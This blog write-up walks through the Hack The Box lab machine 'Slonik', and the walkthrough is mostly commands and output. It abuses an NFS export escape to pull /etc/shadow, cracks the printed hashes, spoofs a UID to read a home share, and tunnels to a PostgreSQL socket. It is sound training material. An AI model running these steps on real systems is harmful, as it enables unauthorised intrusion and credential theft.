---
title: Slonik
date: 2026-03-29
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - Linux
  - medium
lastmod: 2026-04-03T07:36:07.086Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Slonik" >}}

***

# Recon

### \[\[PORT & IP SCAN]]

The `nmap` reveal that the machine is Linux server

```
➜  htb sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.234.160  -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-29 08:53 -0400
Nmap scan report for 10.129.234.160
Host is up (0.056s latency).

PORT      STATE  SERVICE      VERSION
111/tcp   open   rpcbind      2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33600/udp   mountd
|   100005  1,2,3      40927/tcp6  mountd
|   100005  1,2,3      49013/tcp   mountd
|   100005  1,2,3      52555/udp6  mountd
|   100021  1,3,4      36727/udp   nlockmgr
|   100021  1,3,4      37255/tcp   nlockmgr
|   100021  1,3,4      37673/tcp6  nlockmgr
|   100021  1,3,4      45187/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
602/tcp   closed xmlrpc-beep
2049/tcp  open   nfs_acl      3 (RPC #100227)
5067/tcp  closed authentx
6408/tcp  closed boe-resssvr2
9112/tcp  closed unknown
14912/tcp closed unknown
20220/tcp closed unknown
21378/tcp closed unknown
22753/tcp closed unknown
30817/tcp closed unknown
34651/tcp open   mountd       1-3 (RPC #100005)
36917/tcp closed unknown
37015/tcp closed unknown
37255/tcp open   nlockmgr     1-4 (RPC #100021)
39503/tcp closed unknown
42319/tcp closed unknown
42569/tcp open   mountd       1-3 (RPC #100005)
49013/tcp open   mountd       1-3 (RPC #100005)
50152/tcp closed unknown
50743/tcp open   status       1 (RPC #100024)
51383/tcp closed unknown
52680/tcp closed unknown
53893/tcp closed unknown
54318/tcp closed unknown
59089/tcp closed unknown
62471/tcp closed unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds

```

The result shows the `nfs` 's  standard setup

### TCP 2049 nfs\_acl

The [hacktrick](https://hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html) has a good tutorial for step by step to pentest the port  TCP 2049 nfs\_acl

{{< code >}}\
2049/tcp  open   nfs\_acl      3 (RPC #100227)\
{{< /code >}}

```
➜  htb showmount -e 10.129.234.160
Export list for 10.129.234.160:
/var/backups *
/home        *
```

Used the `showmount` to find the `/var/backups` and `/home` that I can try to mount to Linux local.

```
➜  htb mount -t nfs -o ver=2 10.129.234.160:/home /mnt/Slonik
Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.
mount.nfs: an incorrect mount option was specified for /mnt/Slonik
```

Failed to use the mount to find the data , so use another tool may be helpful , like using the netexec

The [Netexe](https://www.netexec.wiki/nfs-protocol/enumeration) also has the reference for it , I will follow it

```
➜  htb nxc nfs 10.129.234.160 
NFS         10.129.234.160  49013  10.129.234.160   [*] Supported NFS versions: (3, 4) (root escape:True)
```

I think the reason why the `mount`failed is the NFS versions , so if we use the new tools may be work.

```shell
➜  htb nxc nfs 10.129.234.160  --shares
NFS         10.129.234.160  49013  10.129.234.160   [*] Supported NFS versions: (3, 4) (root escape:True)
NFS         10.129.234.160  49013  10.129.234.160   [*] Enumerating NFS Shares
NFS         10.129.234.160  49013  10.129.234.160   UID        Perms    Storage Usage    Share                          Access List
NFS         10.129.234.160  49013  10.129.234.160   ---        -----    -------------    -----                          -----------
NFS         10.129.234.160  49013  10.129.234.160   0          r--      2.8GB/6.6GB      /var/backups                   *
NFS         10.129.234.160  49013  10.129.234.160   0          r--      2.8GB/6.6GB      /home      
```

Try to use the `--shares` to enum more files

```
➜  htb nxc nfs 10.129.234.160  --shares
NFS         10.129.234.160  49013  10.129.234.160   [*] Supported NFS versions: (3, 4) (root escape:True)
NFS         10.129.234.160  49013  10.129.234.160   [*] Enumerating NFS Shares
NFS         10.129.234.160  49013  10.129.234.160   UID        Perms    Storage Usage    Share                          Access List
NFS         10.129.234.160  49013  10.129.234.160   ---        -----    -------------    -----                          -----------
NFS         10.129.234.160  49013  10.129.234.160   0          r--      2.8GB/6.6GB      /var/backups                   *
NFS         10.129.234.160  49013  10.129.234.160   0          r--      2.8GB/6.6GB      /home                          *
➜  htb nxc nfs 10.129.234.160 --enum-shares
NFS         10.129.234.160  49013  10.129.234.160   [*] Supported NFS versions: (3, 4) (root escape:True)
NFS         10.129.234.160  49013  10.129.234.160   [*] Enumerating NFS Shares Directories
NFS         10.129.234.160  49013  10.129.234.160   [+] /var/backups
NFS         10.129.234.160  49013  10.129.234.160   UID        Perms    File Size      File Path                                     Access List                                                                                        
NFS         10.129.234.160  49013  10.129.234.160   ---        -----    ---------      ---------                                     -----------                                                                                        
NFS         10.129.234.160  49013  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-29T1320.zip      *                                                                                                  
NFS         10.129.234.160  49013  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-29T1318.zip      *                                                                                                  
NFS         10.129.234.160  49013  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-29T1319.zip      *                                                                                                  
NFS         10.129.234.160  49013  10.129.234.160   [+] /home
NFS         10.129.234.160  49013  10.129.234.160   UID        Perms    File Size      File Path                                     Access List                                                                                        
NFS         10.129.234.160  49013  10.129.234.160   ---        -----    ---------      ---------                                     -----------                                                                                        
NFS         10.129.234.160  49013  10.129.234.160   1337       r--      90.0B          /home/service/.bash_history                   *                                                                                                  
NFS         10.129.234.160  49013  10.129.234.160   1337       r--      0B             /home/service/.cache/motd.legal-displayed     *                                                                                                  
NFS         10.129.234.160  49013  10.129.234.160   1337       r--      326.0B         /home/service/.psql_history                   *                                                                                                  
NFS         10.129.234.160  49013  10.129.234.160   1337       r--      807.0B         /home/service/.profile                        *                                                                                                  
NFS         10.129.234.160  49013  10.129.234.160   1337       r--      3.7KB          /home/service/.bashrc                         *                                                                                                  
NFS         10.129.234.160  49013  10.129.234.160   1337       r--      220.0B         /home/service/.bash_logout                    *                                                                                                  
NFS         10.129.234.160  49013  10.129.234.160   1337       r--      96.0B          /home/service/.ssh/authorized_keys            *                                                                                                  
NFS         10.129.234.160  49013  10.129.234.160   1337       r--      96.0B          /home/service/.ssh/id_ed25519.pub             *                                                                                                  
NFS         10.129.234.160  49013  10.129.234.160   1337       r--      -              /home/service/.local/share/  

```

In the `/var/backups` there is the `zip` file , I think that is the hint , but in the /home also has the `/home/service/.psql_history` , and the `/home/service/.cache/motd.legal-displayed`

but i will try to upload my SSH key first as which is so easy to do it

```shell
┌──(parallels㉿kali-linux-2025-2)-[~/.ssh]
└─$ nxc nfs 10.129.234.160 --put-file /home/parallels/.ssh/id_ed25519.pub /home/service/.ssh/authorized_keys
NFS         10.129.234.160  42445  10.129.234.160   [*] Supported NFS versions: (3, 4) (root escape:True)
NFS         10.129.234.160  42445  10.129.234.160   [*] Uploading from /home/parallels/.ssh/id_ed25519.pub to /home/service/.ssh/authorized_keys
[!] 'authorized_keys' already exists on '/home/service/.ssh/authorized_keys'. Do you want to overwrite it? [Y/n] y
NFS         10.129.234.160  42445  10.129.234.160   [*] 'authorized_keys' already exists on '/home/service/.ssh/authorized_keys'. Trying to overwrite it...
NFS         10.129.234.160  42445  10.129.234.160   [*] Transferring data from '/home/parallels/.ssh/id_ed25519.pub' to '/home/service/.ssh/authorized_keys'
NFS         10.129.234.160  42445  10.129.234.160   [-] Error writing to '/home/service/.ssh/authorized_keys': NFS3ERR_ROFS

```

Not work

Noted the `nxc` show [root escape](https://www.netexec.wiki/nfs-protocol/escape-to-root-file-system) to get the `/etc/exports` for knowing the setting , so you can mount it on your local Linux with setting your local `/etc/passwd` to check the history file step by step .

```shell
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ nxc nfs 10.129.234.160 --enum-shares --ls '/'
NFS         10.129.234.160  42445  10.129.234.160   [*] Supported NFS versions: (3, 4) (root escape:True)
NFS         10.129.234.160  42445  10.129.234.160   [*] Enumerating NFS Shares Directories
NFS         10.129.234.160  42445  10.129.234.160   [+] /var/backups
NFS         10.129.234.160  42445  10.129.234.160   UID        Perms    File Size      File Path                                     Access List    
NFS         10.129.234.160  42445  10.129.234.160   ---        -----    ---------      ---------                                     -----------    
NFS         10.129.234.160  42445  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-31T1214.zip      *              
NFS         10.129.234.160  42445  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-31T1215.zip      *              
NFS         10.129.234.160  42445  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-31T1216.zip      *              
NFS         10.129.234.160  42445  10.129.234.160   [+] /home
NFS         10.129.234.160  42445  10.129.234.160   UID        Perms    File Size      File Path                                     Access List    
NFS         10.129.234.160  42445  10.129.234.160   ---        -----    ---------      ---------                                     -----------    
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      90.0B          /home/service/.bash_history                   *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      0B             /home/service/.cache/motd.legal-displayed     *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      326.0B         /home/service/.psql_history                   *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      807.0B         /home/service/.profile                        *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      3.7KB          /home/service/.bashrc                         *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      220.0B         /home/service/.bash_logout                    *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      96.0B          /home/service/.ssh/authorized_keys            *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      96.0B          /home/service/.ssh/id_ed25519.pub             *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      -              /home/service/.local/share/                   *              
NFS         10.129.234.160  42445  10.129.234.160   [+] Successful escape on share: /var/backups
NFS         10.129.234.160  42445  10.129.234.160   UID        Perms  File Size     File Path
NFS         10.129.234.160  42445  10.129.234.160   ---        -----  ---------     ---------
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /.
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /..
NFS         10.129.234.160  42445  10.129.234.160   0          -rwx   7.0B          /bin
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /boot
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /dev
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /etc
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /home
NFS         10.129.234.160  42445  10.129.234.160   0          -rwx   7.0B          /lib
NFS         10.129.234.160  42445  10.129.234.160   0          -rwx   9.0B          /lib32
NFS         10.129.234.160  42445  10.129.234.160   0          -rwx   9.0B          /lib64
NFS         10.129.234.160  42445  10.129.234.160   0          -rwx   10.0B         /libx32
NFS         10.129.234.160  42445  10.129.234.160   0          d---   16.0KB        /lost+found
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /media
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /mnt
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /opt
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /proc
NFS         10.129.234.160  42445  10.129.234.160   0          d---   4.0KB         /root
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /run
NFS         10.129.234.160  42445  10.129.234.160   0          -rwx   8.0B          /sbin
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /snap
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /srv
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /sys
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /tmp
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /usr
NFS         10.129.234.160  42445  10.129.234.160   0          dr--   4.0KB         /var

```

### /etc/passwd , /etc/shadow

The [idea](attack.mitre.org/techniques/T1003/008/) in here is to download the `/etc/passwd` and /etc/shadow/ for knowing who is on the server .

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ nxc nfs 10.129.234.160  --get-file '/etc/passwd' passwd
NFS         10.129.234.160  42445  10.129.234.160   [*] Supported NFS versions: (3, 4) (root escape:True)
NFS         10.129.234.160  42445  10.129.234.160   [*] Downloading /etc/passwd to passwd
NFS         10.129.234.160  42445  10.129.234.160   File successfully downloaded from /etc/passwd to passwd
                                                                                                                                                                                                                                         
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ nxc nfs 10.129.234.160  --get-file '/etc/shadow' shadow
NFS         10.129.234.160  42445  10.129.234.160   [*] Supported NFS versions: (3, 4) (root escape:True)
NFS         10.129.234.160  42445  10.129.234.160   [*] Downloading /etc/shadow to shadow
NFS         10.129.234.160  42445  10.129.234.160   File successfully downloaded from /etc/shadow to shadow
```

Successfully download the file '/etc/passwd' and  '/etc/shadow'

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cat passwd | grep 'sh$' 
root:x:0:0:root:/root:/bin/bash
postgres:x:115:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

The `passwd` reveals that  the user of root and postgres

Now abuse the passwd and the shadow , and the \$ represent to the real password hashes

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cat shadow | grep '\$' > shadow.hashes 
                                                                                                                                                                                                        
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cat shadow.hashes 
root:$y$j9T$nHJOa2A9rTXPQi3rqjrDI/$mbo9VYMotfEvj4Va5D7Lv0AOzdHRuMwGf.4nue0pZe3:19654:0:99999:7:::
service:$y$j9T$4gRKP9kqW6NvhFfcFU2mL/$KT6bU.KoVCaBDQjkmUIkni5qWJaCTzScIz4B8XwqT/7:19654:0:99999:7:::
```

Find the rockyou file , it is suitable to every kali Linux.

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ locate rockyou.txt
/usr/share/wordlists/rockyou.txt.gz
                                                                                                                                                                                                                                         
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz                                                                            
                                                                                                                                                                                                                                         
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ ls /usr/share/wordlists/rockyou.txt 
/usr/share/wordlists/rockyou.txt
                                            
```

The `/rockyou.txt` is ready to go

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt ./shadow.hashes
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
service          (service)     
```

Use the `john` to get the account service : server

My Idea to try The SSH

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ ssh service@10.129.234.160                           
The authenticity of host '10.129.234.160 (10.129.234.160)' can't be established.
ED25519 key fingerprint is: SHA256:j/hcANass/0veF/m0NAMOR41osL5zUMMMQ9nCYiwjmY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.234.160' (ED25519) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@/     %@@@@@@@@@@.      @&             @@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@   ############.    ############   ##########*  &@@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###############  ###################  /##########  @@@@@@@@@@@@@ 
@@@@@@@@@@ ###############( #######################(  #########  @@@@@@@@@@@@ 
@@@@@@@@@  ############### (#########################  ######### @@@@@@@@@@@@ 
@@@@@@@@@ .##############  ###########################( #######  @@@@@@@@@@@@ 
@@@@@@@@@  ############## (        ##############        ######  @@@@@@@@@@@@ 
@@@@@@@@@. ############## #####   # .########### ##  ##  #####. @@@@@@@@@@@@@ 
@@@@@@@@@@ .############# /########  ########### *##### ###### @@@@@@@@@@@@@@ 
@@@@@@@@@@. ############# (########( ###########/ ##### ##### (@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###########( #########, ############( ####  ### (@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@ (##########/ #########  ##############  ##  #( @@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@( ###########  #######  ################  / #  @@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@  ############  ####  ###################    @@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@, ##########  @@@      ################            (@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@ .######  @@@@   ###  ##############  #######   @@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@(  *   @. #######    ############## (@((&@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&@@@@  #############( @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #############  @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ############# ,@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ############( @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  ###########  @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #######*  @@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
(service@10.129.234.160) Password: 
(service@10.129.234.160) Password:
```

SSH not work

### /etc/exports

back to nfs , i want to know how the `/etc/exports` setting

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ nxc nfs 10.129.234.160 --enum-shares --ls '/etc/exports' 
NFS         10.129.234.160  42445  10.129.234.160   [*] Supported NFS versions: (3, 4) (root escape:True)
NFS         10.129.234.160  42445  10.129.234.160   [*] Enumerating NFS Shares Directories
NFS         10.129.234.160  42445  10.129.234.160   [+] /var/backups
NFS         10.129.234.160  42445  10.129.234.160   UID        Perms    File Size      File Path                                     Access List    
NFS         10.129.234.160  42445  10.129.234.160   ---        -----    ---------      ---------                                     -----------    
NFS         10.129.234.160  42445  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-31T1233.zip      *              
NFS         10.129.234.160  42445  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-31T1234.zip      *              
NFS         10.129.234.160  42445  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-31T1237.zip      *              
NFS         10.129.234.160  42445  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-31T1238.zip      *              
NFS         10.129.234.160  42445  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-31T1241.zip      *              
NFS         10.129.234.160  42445  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-31T1239.zip      *              
NFS         10.129.234.160  42445  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-31T1236.zip      *              
NFS         10.129.234.160  42445  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-31T1235.zip      *              
NFS         10.129.234.160  42445  10.129.234.160   0          r--      4.5MB          /var/backups/archive-2026-03-31T1240.zip      *              
NFS         10.129.234.160  42445  10.129.234.160   [+] /home
NFS         10.129.234.160  42445  10.129.234.160   UID        Perms    File Size      File Path                                     Access List    
NFS         10.129.234.160  42445  10.129.234.160   ---        -----    ---------      ---------                                     -----------    
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      90.0B          /home/service/.bash_history                   *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      0B             /home/service/.cache/motd.legal-displayed     *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      326.0B         /home/service/.psql_history                   *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      807.0B         /home/service/.profile                        *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      3.7KB          /home/service/.bashrc                         *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      220.0B         /home/service/.bash_logout                    *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      96.0B          /home/service/.ssh/authorized_keys            *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      96.0B          /home/service/.ssh/id_ed25519.pub             *              
NFS         10.129.234.160  42445  10.129.234.160   1337       r--      -              /home/service/.local/share/                   *              
NFS         10.129.234.160  42445  10.129.234.160   [+] Successful escape on share: /var/backups
NFS         10.129.234.160  42445  10.129.234.160   UID        Perms  File Size     File Path
NFS         10.129.234.160  42445  10.129.234.160   ---        -----  ---------     ---------
NFS         10.129.234.160  42445  10.129.234.160   0          -r--   126.0B        /etc/exports
```

download it

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ nxc nfs 10.129.234.160 --get-file   '/etc/exports'  exports
NFS         10.129.234.160  42445  10.129.234.160   [*] Supported NFS versions: (3, 4) (root escape:True)
NFS         10.129.234.160  42445  10.129.234.160   [*] Downloading /etc/exports to exports
NFS         10.129.234.160  42445  10.129.234.160   File successfully downloaded from /etc/exports to exports
                                                                                                                                                                                                                                          
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cat exports      
/home                  *(ro,root_squash,sync,no_subtree_check)
/var/backups           *(ro,root_squash,sync,no_subtree_check)
                                                                                                              
```

{{< code >}}\
/home                  \*(ro,root\_squash,sync,no\_subtree\_check)\
/var/backups           \*(ro,root\_squash,sync,no\_subtree\_check)\
{{< /code >}}

mean i can mount the home amd the /var/backups

```

┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo mkdir /mnt/home

┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo mkdir /mnt/backups 
```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo mount -t nfs 10.129.234.160:/home     /mnt/home

sudo mount -t nfs 10.129.234.160:/var/backups /mnt/backups
mount: (hint) your fstab has been modified, but systemd still uses
       the old version; use 'systemctl daemon-reload' to reload.
mount: (hint) your fstab has been modified, but systemd still uses
       the old version; use 'systemctl daemon-reload' to reload.
```

`/mnt/backups` seem like have some problem , but never mind , go for the `home` first

```
┌──(parallels㉿kali-linux-2025-2)-[/mnt/home]
└─$ tree                                    
.
└── service  [error opening dir]

2 directories, 0 files
                                                                                                                                                                                                                                          
┌──(parallels㉿kali-linux-2025-2)-[/mnt/home]
└─$ cd service  
cd: permission denied: service
                                                                                                                                                                                                                                          
┌──(parallels㉿kali-linux-2025-2)-[/mnt/home]
└─$ sudo su service
su: user service does not exist or the user entry does not contain all the required fields

```

### Mount

but i can create the service , and do the service user

```
┌──(parallels㉿kali-linux-2025-2)-[/mnt/home]
└─$ cat /home/parallels/Desktop/passwd | grep serv
service:x:1337:1337:,,,,default password:/home/service:/bin/false
```

{{< code >}}\
service:x:1337:1337:,,,,default password:/home/service:/bin/false\
{{< /code >}}

server 's UID is 1337

```
──(parallels㉿kali-linux-2025-2)-[/mnt/home]
└─$ sudo useradd -u 1337 -m -s /bin/bash service
                                                                                                                                                                                                                                          
┌──(parallels㉿kali-linux-2025-2)-[/mnt/home]
└─$ sudo passwd service
New password: 
Retype new password: 
passwd: password updated successfully
```

change to service : service to do it

```
┌──(parallels㉿kali-linux-2025-2)-[/mnt/home]
└─$ su service         
Password: 
┌──(service㉿kali-linux-2025-2)-[/mnt/home]
└─$ ls                                                                                                                                                                                                                                    
service

┌──(service㉿kali-linux-2025-2)-[/mnt/home]
└─$ cd service/                                                                                                                                                                                                                           
                                                    

┌──(service㉿kali-linux-2025-2)-[/mnt/home/service]
└─$ ls -al                                                                                                                                                                                                                                
total 40
drwxr-x--- 5 service service 4096 Sep 22  2025 .
drwxr-xr-x 3 root    root    4096 Oct 24  2023 ..
-rw-r--r-- 1 service service   90 Sep 22  2025 .bash_history
-rw-r--r-- 1 service service  220 Oct 24  2023 .bash_logout
-rw-r--r-- 1 service service 3771 Oct 24  2023 .bashrc
drwx------ 2 service service 4096 Oct 24  2023 .cache
drwxrwxr-x 3 service service 4096 Oct 24  2023 .local
-rw-r--r-- 1 service service  807 Oct 24  2023 .profile
-rw-r--r-- 1 service service  326 Sep 22  2025 .psql_history
drwxrwxr-x 2 service service 4096 Oct 24  2023 .ssh
```

`.psql_history` is so out-standing

```
CREATE DATABASE service;
\c service;
CREATE TABLE users ( id SERIAL PRIMARY KEY, username VARCHAR(255) NOT NULL, password VARCHAR(255) NOT NULL, description TEXT);
INSERT INTO users (username, password, description)VALUES ('service', 'aaabf0d39951f3e6c3e8a7911df524c2'WHERE', network access account');
select * from users;
\q
```

this history , seem like say the service 's  another password `aaabf0d39951f3e6c3e8a7911df524c2`

![Pasted image 20260331205538.png](/ob/Pasted%20image%2020260331205538.png)

crackstation also give the result is service

`.bash_history`

```
ls -lah /var/run/postgresql/
file /var/run/postgresql/.s.PGSQL.5432
psql -U postgres
exit
```

### Create Tunnel to PostgreSQL

What is UNIX socket?

![Pasted image 20260403134907.png](/ob/Pasted%20image%2020260403134907.png)

Like the Ubuntu how to connect with the nginx that is used the UNIX socket , not the TCP ,  Unix Domain Socket is a method which needs to both in the same machine , so the cross process dont need to access the network layer , will through the kernal and the file , so we can use the `SSHPASS` with `-L` to do that

![Pasted image 20260403135942.png](/ob/Pasted%20image%2020260403135942.png)

Dont 100% trust the AI . . .

![Pasted image 20260403141621.png](/ob/Pasted%20image%2020260403141621.png)

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  sshpass -p service ssh -N -L 5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@/     %@@@@@@@@@@.      @&             @@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@   ############.    ############   ##########*  &@@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###############  ###################  /##########  @@@@@@@@@@@@@ 
@@@@@@@@@@ ###############( #######################(  #########  @@@@@@@@@@@@ 
@@@@@@@@@  ############### (#########################  ######### @@@@@@@@@@@@ 
@@@@@@@@@ .##############  ###########################( #######  @@@@@@@@@@@@ 
@@@@@@@@@  ############## (        ##############        ######  @@@@@@@@@@@@ 
@@@@@@@@@. ############## #####   # .########### ##  ##  #####. @@@@@@@@@@@@@ 
@@@@@@@@@@ .############# /########  ########### *##### ###### @@@@@@@@@@@@@@ 
@@@@@@@@@@. ############# (########( ###########/ ##### ##### (@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###########( #########, ############( ####  ### (@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@ (##########/ #########  ##############  ##  #( @@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@( ###########  #######  ################  / #  @@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@  ############  ####  ###################    @@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@, ##########  @@@      ################            (@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@ .######  @@@@   ###  ##############  #######   @@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@(  *   @. #######    ############## (@((&@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&@@@@  #############( @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #############  @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ############# ,@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ############( @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  ###########  @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #######*  @@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
